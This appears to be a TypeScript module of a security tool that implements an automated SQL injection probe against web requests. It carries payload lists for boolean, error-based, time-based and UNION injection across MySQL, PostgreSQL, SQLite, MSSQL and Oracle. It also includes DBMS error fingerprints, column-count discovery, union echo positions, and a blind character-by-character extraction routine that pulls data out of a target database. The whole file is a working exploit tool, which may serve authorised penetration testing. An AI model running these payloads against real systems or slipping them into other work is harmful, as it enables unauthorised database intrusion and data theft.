import { randomUUID } from "node:crypto";
import { createCodedError } from "../../../utils/codedError";
import { compactStep, extractTitle, responseBodyHash, responseDistance, responseFingerprint, responsesDiffer } from "../shared/http";
import { asString, isRecord, positiveInt, sleep, splitWords, stringList } from "../shared/normalize";
import { buildReplayRequest, existingParamNames, inferFuzzParamLocations, mutateParamRequest, normalizeReplayOptions, sendReplayLikeRequest } from "../shared/replay";
import type { FetchStep, SqliProbeOptions } from "../shared/types";

const DEFAULT_SQLI_BOOLEAN_PAIRS = [
	{ name: "single-quote-and", truePayload: "' AND 1=1--", falsePayload: "' AND 1=2--" },
	{ name: "double-quote-and", truePayload: "\" AND 1=1--", falsePayload: "\" AND 1=2--" },
	{ name: "numeric-and", truePayload: " AND 1=1", falsePayload: " AND 1=2" },
	{ name: "single-quote-or", truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
];
const DEFAULT_SQLI_ERROR_PAYLOADS = ["'", "\"", "')", "\")", "`"];
const DEFAULT_SQLI_TIME_PAYLOADS = ["' AND SLEEP(5)--", "\" AND SLEEP(5)--", "'; SELECT pg_sleep(5)--", "; WAITFOR DELAY '0:0:5'--"];
const SQL_DBMS_SIGNATURES = [
	{ dbms: "mysql", patterns: [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySqlException/i, /You have an error in your SQL syntax/i] },
	{ dbms: "postgresql", patterns: [/PostgreSQL.*ERROR/i, /pg_query\(/i, /pg_sleep/i, /unterminated quoted string/i] },
	{ dbms: "sqlite", patterns: [/SQLite(?:3)?::|sqlite error|SQLITE_ERROR/i] },
	{ dbms: "oracle", patterns: [/ORA-\d{5}/i] },
	{ dbms: "mssql", patterns: [/Microsoft SQL Server|ODBC SQL Server|SQLServerException/i, /unclosed quotation mark/i, /WAITFOR DELAY/i] },
];
const SQL_ERROR_PATTERNS = [...SQL_DBMS_SIGNATURES.flatMap((item) => item.patterns), /syntax error\s+(?:at|near)/i, /The used SELECT statements have a different number of columns/i, /Unknown column/i];
const SQLI_DBMS_PAYLOAD_PACKS: Record<string, { booleanPairs: Array<{ name: string; truePayload: string; falsePayload: string }>; errorPayloads: string[]; timePayloads: string[] }> = {
	mysql: { booleanPairs: [{ name: "mysql-if", truePayload: "' AND IF(1=1,1,0)--", falsePayload: "' AND IF(1=2,1,0)--" }], errorPayloads: ["' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"], timePayloads: ["' AND SLEEP(5)--"] },
	postgresql: { booleanPairs: [{ name: "postgres-case", truePayload: "' AND CASE WHEN 1=1 THEN true ELSE false END--", falsePayload: "' AND CASE WHEN 1=2 THEN true ELSE false END--" }], errorPayloads: ["'::int", "'; SELECT CAST(version() AS int)--"], timePayloads: ["'; SELECT pg_sleep(5)--"] },
	sqlite: { booleanPairs: [{ name: "sqlite-like", truePayload: "' AND 1 LIKE 1--", falsePayload: "' AND 1 LIKE 2--" }], errorPayloads: ["' AND load_extension(1)--"], timePayloads: ["' AND randomblob(500000000)--"] },
	mssql: { booleanPairs: [{ name: "mssql-convert", truePayload: "' AND IIF(1=1,1,0)=1--", falsePayload: "' AND IIF(1=2,1,0)=1--" }], errorPayloads: ["' AND CONVERT(int,@@version)--"], timePayloads: ["'; WAITFOR DELAY '0:0:5'--"] },
	oracle: { booleanPairs: [{ name: "oracle-case", truePayload: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--", falsePayload: "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1--" }], errorPayloads: ["' AND TO_NUMBER(BANNER)=1 FROM v$version--"], timePayloads: ["' AND DBMS_LOCK.SLEEP(5)=0--"] },
};

type SqliProbeCase = { kind: string; name: string; location: string; paramName: string; payload?: string; truePayload?: string; falsePayload?: string };

type NormalizedSqliProbeOptions = ReturnType<typeof normalizeReplayOptions> & {
	locations: string[];
	paramNames: string[];
	probeTypes: string[];
	payloadMode: "append" | "replace";
	requestedDbms: string[];
	booleanPairs: Array<{ name: string; truePayload: string; falsePayload: string }>;
	errorPayloads: string[];
	timePayloads: string[];
	unionPayloads: string[];
	maxCases: number;
	rateLimitPerSecond: number;
	delayMs: number;
	timeThresholdMs: number;
	baselineRepeats: number;
	stopOnFirstMatch: boolean;
};

function parseBooleanPayloadPairs(value: unknown): Array<{ name: string; truePayload: string; falsePayload: string }> {
	if (!value) return DEFAULT_SQLI_BOOLEAN_PAIRS;
	const out: Array<{ name: string; truePayload: string; falsePayload: string }> = [];
	for (const item of Array.isArray(value) ? value : [value]) {
		if (isRecord(item)) {
			const truePayload = asString(item.truePayload ?? item.true ?? item.truthy);
			const falsePayload = asString(item.falsePayload ?? item.false ?? item.falsy);
			if (truePayload && falsePayload) out.push({ name: asString(item.name) || `pair-${out.length + 1}`, truePayload, falsePayload });
			continue;
		}
		const text = asString(item);
		if (!text) continue;
		const parts = text.split(/\s*\|\|\s*|\s*=>\s*|\s*,\s*/).filter(Boolean);
		if (parts.length >= 2) out.push({ name: `pair-${out.length + 1}`, truePayload: parts[0], falsePayload: parts[1] });
	}
	return out.length ? out : DEFAULT_SQLI_BOOLEAN_PAIRS;
}

function selectedSqlDbms(value: unknown): string[] {
	const requested = stringList(value).flatMap((item) => item.split(/[\s,]+/)).map((item) => item.toLowerCase()).filter(Boolean);
	const known = Object.keys(SQLI_DBMS_PAYLOAD_PACKS);
	if (!requested.length || requested.includes("auto")) return [];
	return [...new Set(requested.filter((item) => known.includes(item)))];
}

function sqliBooleanPairs(options: SqliProbeOptions, dbmsList: string[]): Array<{ name: string; truePayload: string; falsePayload: string }> {
	const explicit = options.booleanPayloadPairs !== undefined;
	const pairs = parseBooleanPayloadPairs(options.booleanPayloadPairs);
	if (explicit || !dbmsList.length) return pairs;
	return [...pairs, ...dbmsList.flatMap((dbms) => SQLI_DBMS_PAYLOAD_PACKS[dbms]?.booleanPairs || [])];
}

function sqliErrorPayloads(options: SqliProbeOptions, dbmsList: string[]): string[] {
	const explicit = [...splitWords(options.errorPayloads), ...splitWords(options.payloads)];
	if (explicit.length) return explicit;
	return [...DEFAULT_SQLI_ERROR_PAYLOADS, ...dbmsList.flatMap((dbms) => SQLI_DBMS_PAYLOAD_PACKS[dbms]?.errorPayloads || [])];
}

function sqliTimePayloads(options: SqliProbeOptions, dbmsList: string[]): string[] {
	const explicit = splitWords(options.timePayloads);
	if (explicit.length) return explicit;
	return [...DEFAULT_SQLI_TIME_PAYLOADS, ...dbmsList.flatMap((dbms) => SQLI_DBMS_PAYLOAD_PACKS[dbms]?.timePayloads || [])];
}

function hasSqlError(text: string): boolean {
	return SQL_ERROR_PATTERNS.some((pattern) => pattern.test(text));
}

function detectSqlDbms(text: string): string[] {
	return SQL_DBMS_SIGNATURES.filter((signature) => signature.patterns.some((pattern) => pattern.test(text))).map((signature) => signature.dbms);
}

function generatedUnionPayloads(options: SqliProbeOptions): string[] {
	const explicit = splitWords(options.unionPayloads);
	if (explicit.length) return explicit;
	const orderByMax = Math.min(64, positiveInt(options.orderByMax, 3));
	const unionColumnMax = Math.min(64, positiveInt(options.unionColumnMax, 3));
	const payloads: string[] = [];
	for (let i = 1; i <= orderByMax; i += 1) payloads.push(`' ORDER BY ${i}--`);
	for (let i = 1; i <= unionColumnMax; i += 1) payloads.push(`' UNION SELECT ${Array.from({ length: i }, () => "NULL").join(",")}--`);
	return payloads.length ? payloads : ["' ORDER BY 1--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"];
}

function sqliUnionMeta(payload: string): Record<string, unknown> {
	const order = payload.match(/order\s+by\s+(\d+)/i);
	if (order) return { unionTechnique: "order-by", columnCount: Number(order[1]) };
	const union = payload.match(/union\s+(?:all\s+)?select\s+([\s\S]*?)(?:--|#|\/\*|$)/i);
	if (union) {
		const cols = union[1].split(",").map((item) => item.trim()).filter(Boolean).length;
		return { unionTechnique: "union-select", columnCount: cols };
	}
	return {};
}

function inferSqliColumnHints(results: Array<Record<string, unknown>>): Array<Record<string, unknown>> {
	const groups = new Map<string, Array<Record<string, unknown>>>();
	for (const result of results) {
		if (result.type !== "union") continue;
		const key = `${result.location}:${result.paramName}`;
		const items = groups.get(key) || [];
		items.push(result);
		groups.set(key, items);
	}
	const hints: Array<Record<string, unknown>> = [];
	for (const [key, items] of groups.entries()) {
		const [location, paramName] = key.split(":");
		const orderItems = items.filter((item) => item.unionTechnique === "order-by" && typeof item.columnCount === "number").sort((a, b) => Number(a.columnCount) - Number(b.columnCount));
		const firstOrderError = orderItems.find((item) => item.sqlError === true || (isRecord(item.response) && Number(item.response.status) >= 500));
		const orderByMaxValid = firstOrderError ? Number(firstOrderError.columnCount) - 1 : undefined;
		const unionSuccess = items.find((item) => item.unionTechnique === "union-select" && item.matched === true && item.sqlError !== true && isRecord(item.response) && Number(item.response.status) < 500);
		if (orderByMaxValid !== undefined || unionSuccess) hints.push({ location, paramName, orderByMaxValid, unionSelectColumns: unionSuccess?.columnCount, confidence: unionSuccess ? "union-select" : "order-by" });
	}
	return hints;
}

function unionEchoPayload(columnCount: number, position: number, marker: string): string {
	const columns = Array.from({ length: columnCount }, (_, index) => index + 1 === position ? `'${marker}'` : "NULL");
	return `' UNION SELECT ${columns.join(",")}--`;
}

function blindAsciiPayload(dbms: string | undefined, expression: string, position: number, code: number): string {
	const engine = dbms || "mysql";
	if (engine === "sqlite") return `' AND unicode(substr((${expression}),${position},1))=${code}--`;
	if (engine === "oracle") return `' AND ASCII(SUBSTR((${expression}),${position},1))=${code}--`;
	return `' AND ASCII(SUBSTRING((${expression}),${position},1))=${code}--`;
}

function nearestBooleanTruth(fp: ReturnType<typeof responseFingerprint>, oracle: { trueFp: ReturnType<typeof responseFingerprint>; falseFp: ReturnType<typeof responseFingerprint> }): boolean {
	return responseDistance(fp, oracle.trueFp) < responseDistance(fp, oracle.falseFp);
}

function firstBooleanOracle(results: Array<Record<string, unknown>>): { location: string; paramName: string; trueFp: ReturnType<typeof responseFingerprint>; falseFp: ReturnType<typeof responseFingerprint> } | undefined {
	for (const item of results) {
		if (item.type !== "boolean" || item.matched !== true || !isRecord(item.trueResponse) || !isRecord(item.falseResponse) || !isRecord(item.trueResponse.fingerprint) || !isRecord(item.falseResponse.fingerprint)) continue;
		return { location: String(item.location), paramName: String(item.paramName), trueFp: item.trueResponse.fingerprint as ReturnType<typeof responseFingerprint>, falseFp: item.falseResponse.fingerprint as ReturnType<typeof responseFingerprint> };
	}
	return undefined;
}

function sqliProbeTypes(value: unknown): string[] {
	const requested = splitWords(value).flatMap((item) => item.split(/[,\s]+/)).map((item) => item.toLowerCase()).filter(Boolean);
	if (!requested.length || requested.includes("all")) return ["boolean", "error", "time", "union"];
	return [...new Set(requested.filter((item) => ["boolean", "error", "time", "union"].includes(item)))];
}

function existingParamValue(request: { url: string; headers: Record<string, string>; body?: string | Buffer }, location: string, paramName: string): string {
	if (location === "query") return new URL(request.url).searchParams.get(paramName) || "";
	if (location === "header") return Object.entries(request.headers).find(([name]) => name.trim().toLowerCase() === paramName.trim().toLowerCase())?.[1] || "";
	const body = typeof request.body === "string" || Buffer.isBuffer(request.body) ? request.body.toString() : "";
	if (location === "form") return new URLSearchParams(body).get(paramName) || "";
	if (location === "json" && body) {
		try {
			const parsed = JSON.parse(body);
			return isRecord(parsed) && parsed[paramName] !== undefined ? String(parsed[paramName]) : "";
		} catch {}
	}
	return "";
}

function sqliPayloadValue(baseRequest: { url: string; headers: Record<string, string>; body?: string | Buffer }, location: string, paramName: string, payload: string, mode: string): string {
	if (mode === "replace") return payload;
	return `${existingParamValue(baseRequest, location, paramName)}${payload}`;
}

function sqliResponseRecord(final: FetchStep, exchange: { chain: FetchStep[]; final: FetchStep }) {
	return {
		url: final.url,
		status: final.status,
		title: extractTitle(final.bodyText),
		bodyBytes: final.bodyBytes,
		bodyTruncated: final.bodyTruncated,
		elapsedMs: final.elapsedMs,
		fingerprint: responseFingerprint(final),
		redirects: exchange.chain.slice(0, -1).map(compactStep),
		body: { text: final.bodyText, base64: final.bodyBase64 },
	};
}

function sqliProbeInputError(message: string, details: Record<string, unknown> = {}): Error {
	return createCodedError({ name: "SqliProbeInputError", code: "INVALID_RULE", message, details, suppressStack: false });
}

async function normalizeSqliProbeOptions(options: SqliProbeOptions): Promise<NormalizedSqliProbeOptions> {
	const baseRequest = buildReplayRequest(options);
	const locations = inferFuzzParamLocations(baseRequest, options.locations);
	if (!locations.length) throw sqliProbeInputError("browser_sqli_probe requires locations or an inferable query/json/form request", { field: "locations" });
	const explicitParamNames = stringList(options.paramNames);
	const paramNames = explicitParamNames.length ? explicitParamNames : existingParamNames(baseRequest, locations);
	if (!paramNames.length) throw sqliProbeInputError("browser_sqli_probe requires paramNames or existing request parameters", { field: "paramNames" });
	const probeTypes = sqliProbeTypes(options.probeTypes);
	const payloadMode = String(options.payloadMode || "append").toLowerCase() === "replace" ? "replace" : "append";
	const requestedDbms = selectedSqlDbms(options.dbms);
	const booleanPairs = sqliBooleanPairs(options, requestedDbms);
	const errorPayloads = sqliErrorPayloads(options, requestedDbms);
	const timePayloads = sqliTimePayloads(options, requestedDbms);
	const unionPayloads = generatedUnionPayloads(options);
	const maxCases = Math.min(5_000, positiveInt(options.maxCases, 100));
	const rateLimitPerSecond = positiveInt(options.rateLimitPerSecond, 0);
	const timeThresholdMs = positiveInt(options.timeThresholdMs, 2_000);
	const baselineRepeats = Math.min(10, positiveInt(options.baselineRepeats, 1));
	const stopOnFirstMatch = options.stopOnFirstMatch === true;
	return {
		...normalizeReplayOptions(options),
		locations,
		paramNames,
		probeTypes,
		payloadMode,
		requestedDbms,
		booleanPairs,
		errorPayloads,
		timePayloads,
		unionPayloads,
		maxCases,
		rateLimitPerSecond,
		delayMs: rateLimitPerSecond > 0 ? Math.ceil(1000 / rateLimitPerSecond) : 0,
		timeThresholdMs,
		baselineRepeats,
		stopOnFirstMatch,
	};
}

export async function runSqliProbe(options: SqliProbeOptions) {
	const baseRequest = buildReplayRequest(options);
	const normalized = await normalizeSqliProbeOptions(options);
	const limitedCases: SqliProbeCase[] = [];
	let totalCaseCount = 0;
	for (const location of normalized.locations) {
		for (const paramName of normalized.paramNames) {
			if (normalized.probeTypes.includes("boolean")) for (const pair of normalized.booleanPairs) {
				totalCaseCount += 1;
				if (limitedCases.length < normalized.maxCases) limitedCases.push({ kind: "boolean", name: pair.name, location, paramName, truePayload: pair.truePayload, falsePayload: pair.falsePayload });
			}
			if (normalized.probeTypes.includes("error")) for (const payload of normalized.errorPayloads) {
				totalCaseCount += 1;
				if (limitedCases.length < normalized.maxCases) limitedCases.push({ kind: "error", name: payload, location, paramName, payload });
			}
			if (normalized.probeTypes.includes("time")) for (const payload of normalized.timePayloads) {
				totalCaseCount += 1;
				if (limitedCases.length < normalized.maxCases) limitedCases.push({ kind: "time", name: payload, location, paramName, payload });
			}
			if (normalized.probeTypes.includes("union")) for (const payload of normalized.unionPayloads) {
				totalCaseCount += 1;
				if (limitedCases.length < normalized.maxCases) limitedCases.push({ kind: "union", name: payload, location, paramName, payload });
			}
		}
	}
	const baselineResponses = [] as Array<Record<string, unknown>>;
	let baselineFinal: FetchStep | undefined;
	let baselineExchange: { chain: FetchStep[]; final: FetchStep } | undefined;
	for (let i = 0; i < normalized.baselineRepeats; i += 1) {
		const sent = await sendReplayLikeRequest(baseRequest, normalized);
		baselineFinal = sent.exchange.final;
		baselineExchange = sent.exchange;
		baselineResponses.push(sqliResponseRecord(sent.exchange.final, sent.exchange));
	}
	if (!baselineFinal || !baselineExchange) throw createCodedError({ name: "SqliProbeRuntimeError", code: "TIMEOUT", message: "browser_sqli_probe could not establish baseline response", details: { phase: "baseline" }, suppressStack: false });
	const baselineFingerprint = responseFingerprint(baselineFinal);
	const baselineError = hasSqlError(baselineFinal.bodyText);
	const baselineDbms = detectSqlDbms(baselineFinal.bodyText);
	const results: Array<Record<string, unknown>> = [];
	const matched: Array<Record<string, unknown>> = [];
	const failures: Array<Record<string, unknown>> = [];
	const echoPositions: Array<Record<string, unknown>> = [];
	const extractions: Array<Record<string, unknown>> = [];
	let requestCount = 0;
	let extraCaseCount = 0;
	const shortCircuitedTargets = new Set<string>();
	for (const item of limitedCases) {
		const targetKey = `${item.location}:${item.paramName}`;
		if (normalized.stopOnFirstMatch && shortCircuitedTargets.has(targetKey)) continue;
		try {
			if (item.kind === "boolean") {
				const trueValue = sqliPayloadValue(baseRequest, item.location, item.paramName, item.truePayload || "", normalized.payloadMode);
				const falseValue = sqliPayloadValue(baseRequest, item.location, item.paramName, item.falsePayload || "", normalized.payloadMode);
				const trueRequest = mutateParamRequest(baseRequest, item.location, item.paramName, trueValue);
				const trueReplay = await sendReplayLikeRequest(trueRequest, normalized);
				requestCount += 1;
				if (normalized.delayMs > 0) await sleep(normalized.delayMs);
				const falseRequest = mutateParamRequest(baseRequest, item.location, item.paramName, falseValue);
				const falseReplay = await sendReplayLikeRequest(falseRequest, normalized);
				requestCount += 1;
				const trueFp = responseFingerprint(trueReplay.exchange.final);
				const falseFp = responseFingerprint(falseReplay.exchange.final);
				const oracle = responsesDiffer(trueFp, falseFp);
				const baselineAffinity = { trueDistance: responseDistance(baselineFingerprint, trueFp), falseDistance: responseDistance(baselineFingerprint, falseFp) };
				const evidence = { type: "boolean", matched: oracle, location: item.location, paramName: item.paramName, payloads: { truePayload: item.truePayload, falsePayload: item.falsePayload }, baselineAffinity, trueResponse: sqliResponseRecord(trueReplay.exchange.final, trueReplay.exchange), falseResponse: sqliResponseRecord(falseReplay.exchange.final, falseReplay.exchange) };
				results.push(evidence);
				if (oracle) {
					matched.push(evidence);
					if (normalized.stopOnFirstMatch) shortCircuitedTargets.add(targetKey);
				}
			} else {
				const value = sqliPayloadValue(baseRequest, item.location, item.paramName, item.payload || "", normalized.payloadMode);
				const request = mutateParamRequest(baseRequest, item.location, item.paramName, value);
				const replay = await sendReplayLikeRequest(request, normalized);
				requestCount += 1;
				const final = replay.exchange.final;
				const fp = responseFingerprint(final);
				const bodyHasSqlError = hasSqlError(final.bodyText);
				const dbms = detectSqlDbms(final.bodyText);
				const elapsedDeltaMs = final.elapsedMs - baselineFinal.elapsedMs;
				const matchedCase = item.kind === "error" ? bodyHasSqlError && !baselineError : item.kind === "time" ? elapsedDeltaMs >= normalized.timeThresholdMs : responsesDiffer(baselineFingerprint, fp);
				const evidence = { type: item.kind, matched: matchedCase, location: item.location, paramName: item.paramName, payload: item.payload, ...sqliUnionMeta(item.payload || ""), elapsedDeltaMs, sqlError: bodyHasSqlError, dbms, baselineDistance: responseDistance(baselineFingerprint, fp), response: sqliResponseRecord(final, replay.exchange) };
				results.push(evidence);
				if (matchedCase) {
					matched.push(evidence);
					if (normalized.stopOnFirstMatch) shortCircuitedTargets.add(targetKey);
				}
			}
		} catch (error) {
			failures.push({ type: item.kind, location: item.location, paramName: item.paramName, payload: item.payload, truePayload: item.truePayload, falsePayload: item.falsePayload, error: error instanceof Error ? error.message : String(error) });
		}
		if (normalized.delayMs > 0 && requestCount > 0) await sleep(normalized.delayMs);
	}
	let columnHints = inferSqliColumnHints(results);
	if (normalized.probeTypes.includes("union") && options.unionEcho !== false && !normalized.stopOnFirstMatch) {
		for (const hint of columnHints) {
			const columnCount = positiveInt(hint.unionSelectColumns ?? hint.orderByMaxValid, 0);
			if (!columnCount) continue;
			for (let position = 1; position <= columnCount && limitedCases.length + extraCaseCount < normalized.maxCases; position += 1) {
				const marker = `pi_sql_echo_${position}_${randomUUID().replace(/-/g, "").slice(0, 8)}`;
				const payload = unionEchoPayload(columnCount, position, marker);
				try {
					const value = sqliPayloadValue(baseRequest, String(hint.location), String(hint.paramName), payload, normalized.payloadMode);
					const request = mutateParamRequest(baseRequest, String(hint.location), String(hint.paramName), value);
					const replay = await sendReplayLikeRequest(request, normalized);
					requestCount += 1;
					extraCaseCount += 1;
					const final = replay.exchange.final;
					const reflected = final.bodyText.includes(marker);
					const evidence = { type: "union-echo", matched: reflected, location: hint.location, paramName: hint.paramName, columnCount, echoPosition: position, marker, payload, response: sqliResponseRecord(final, replay.exchange) };
					results.push(evidence);
					if (reflected) {
						matched.push(evidence);
						echoPositions.push({ location: hint.location, paramName: hint.paramName, columnCount, position, marker });
					}
				} catch (error) {
					failures.push({ type: "union-echo", location: hint.location, paramName: hint.paramName, columnCount, position, error: error instanceof Error ? error.message : String(error) });
				}
				if (normalized.delayMs > 0) await sleep(normalized.delayMs);
			}
		}
	}
	const extractExpression = asString(options.extractExpression)?.trim();
	const oracle = extractExpression ? firstBooleanOracle(results) : undefined;
	if (extractExpression && oracle && limitedCases.length + extraCaseCount < normalized.maxCases) {
		const charset = asString(options.extractCharset) || "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-@.:/ ";
		const maxLength = Math.min(256, positiveInt(options.extractMaxLength, 32));
		const dbms = normalized.requestedDbms[0] || undefined;
		let value = "";
		let complete = false;
		let attempts = 0;
		for (let position = 1; position <= maxLength && limitedCases.length + extraCaseCount < normalized.maxCases; position += 1) {
			let found = "";
			for (const char of Array.from(charset)) {
				if (limitedCases.length + extraCaseCount >= normalized.maxCases) break;
				const payload = blindAsciiPayload(dbms, extractExpression, position, char.charCodeAt(0));
				try {
					const requestValue = sqliPayloadValue(baseRequest, oracle.location, oracle.paramName, payload, normalized.payloadMode);
					const request = mutateParamRequest(baseRequest, oracle.location, oracle.paramName, requestValue);
					const replay = await sendReplayLikeRequest(request, normalized);
					requestCount += 1;
					extraCaseCount += 1;
					attempts += 1;
					if (nearestBooleanTruth(responseFingerprint(replay.exchange.final), oracle)) {
						found = char;
						break;
					}
				} catch (error) {
					failures.push({ type: "blind-extract", location: oracle.location, paramName: oracle.paramName, position, char, error: error instanceof Error ? error.message : String(error) });
				}
				if (normalized.delayMs > 0) await sleep(normalized.delayMs);
			}
			if (!found) {
				complete = true;
				break;
			}
			value += found;
		}
		extractions.push({ location: oracle.location, paramName: oracle.paramName, expression: extractExpression, value, length: value.length, attempts, complete, dbms: dbms || "generic" });
	}
	const oracleTypes = [...new Set(matched.map((item) => String(item.type || "unknown")))];
	const dbmsFingerprints = [...new Set([...normalized.requestedDbms, ...baselineDbms, ...results.flatMap((item) => Array.isArray(item.dbms) ? item.dbms.map(String) : [])])];
	columnHints = inferSqliColumnHints(results);
	return { ok: failures.length === 0, generatedAt: new Date().toISOString(), baseline: baselineResponses[baselineResponses.length - 1], baselineRepeats: normalized.baselineRepeats, locationCount: normalized.locations.length, paramCount: normalized.paramNames.length, probeTypes: normalized.probeTypes, payloadMode: normalized.payloadMode, dbmsPayloadPack: normalized.requestedDbms, caseCount: limitedCases.length + extraCaseCount, requestCount, matchedCount: matched.length, oracleTypes, dbmsFingerprints, columnHints, echoPositions, extractions, truncatedCases: Math.max(0, totalCaseCount - limitedCases.length), timeThresholdMs: normalized.timeThresholdMs, results, matched, failures };
}
